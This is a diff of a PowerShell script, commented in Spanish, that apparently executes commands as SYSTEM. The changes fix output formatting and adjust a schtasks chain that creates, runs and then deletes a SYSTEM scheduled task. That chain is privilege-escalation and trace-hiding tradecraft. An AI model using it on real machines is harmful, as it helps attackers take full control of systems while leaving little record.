@@ -153,9 +153,9 @@ Function Execute-Command($CommandToExecute) {
             # Verificar si hay output
             if (Test-Path $outputFile) {
                 Write-Host "[+] Output del comando:" -ForegroundColor Green
-                Write-Host "=" * 50 -ForegroundColor Cyan
+                Write-Host ("=" * 50) -ForegroundColor Cyan
                 Get-Content $outputFile
-                Write-Host "=" * 50 -ForegroundColor Cyan
+                Write-Host ("=" * 50) -ForegroundColor Cyan
             } else {
                 Write-Host "[-] No se generó output visible" -ForegroundColor Yellow
                 Write-Host "[!] El comando puede estar ejecutándose en segundo plano" -ForegroundColor Yellow
@@ -176,7 +176,7 @@ Function Execute-Command($CommandToExecute) {
     }
 }
 
-# Función corregida para ejecutar comandos como SYSTEM usando scheduled tasks
+# Función mejorada para ejecutar comandos como SYSTEM
 Function Execute-CommandAsSystem {
     param(
         [string]$CommandToExecute
@@ -200,9 +200,7 @@ $CommandToExecute > "$outputFile" 2>&1
         Write-Host "[+] Creando tarea programada como SYSTEM..." -ForegroundColor Yellow
         
         # Crear, ejecutar y eliminar tarea programada en un solo comando
-        $fullCommand = @"
-schtasks /create /tn "$taskName" /tr "$scriptFile" /sc once /st 00:00 /ru SYSTEM /f >nul 2>&1 && schtasks /run /tn "$taskName" >nul 2>&1 && timeout /t 3 >nul && schtasks /delete /tn "$taskName" /f >nul 2>&1
-"@
+        $fullCommand = "schtasks /create /tn `"$taskName`" /tr `"$scriptFile`" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn `"$taskName`" && timeout /t 5 && schtasks /delete /tn `"$taskName`" /f"
         
         $result = Execute-Command -CommandToExecute $fullCommand
         
@@ -210,12 +208,12 @@ schtasks /create /tn "$taskName" /tr "$scriptFile" /sc once /st 00:00 /ru SYSTEM
             Write-Host "[+] Tarea programada ejecutada como SYSTEM" -ForegroundColor Green
             
             # Esperar un poco más para que el comando termine
-            Start-Sleep -Seconds 3
+            Start-Sleep -Seconds 5
             
             # Leer output si existe
             if (Test-Path $outputFile) {
                 Write-Host "[+] Output del comando (como SYSTEM):" -ForegroundColor Green
-                Write-Host "=" * 50 -ForegroundColor Cyan
+                Write-Host ("=" * 50) -ForegroundColor Cyan
                 $content = Get-Content $outputFile
                 if ($content) {
                     foreach ($line in $content) {
@@ -224,7 +222,7 @@ schtasks /create /tn "$taskName" /tr "$scriptFile" /sc once /st 00:00 /ru SYSTEM
                 } else {
                     Write-Host "(Comando ejecutado sin output visible)"
                 }
-                Write-Host "=" * 50 -ForegroundColor Cyan
+                Write-Host ("=" * 50) -ForegroundColor Cyan
             } else {
                 Write-Host "[!] No se generó output, pero el comando pudo ejecutarse" -ForegroundColor Yellow
             }
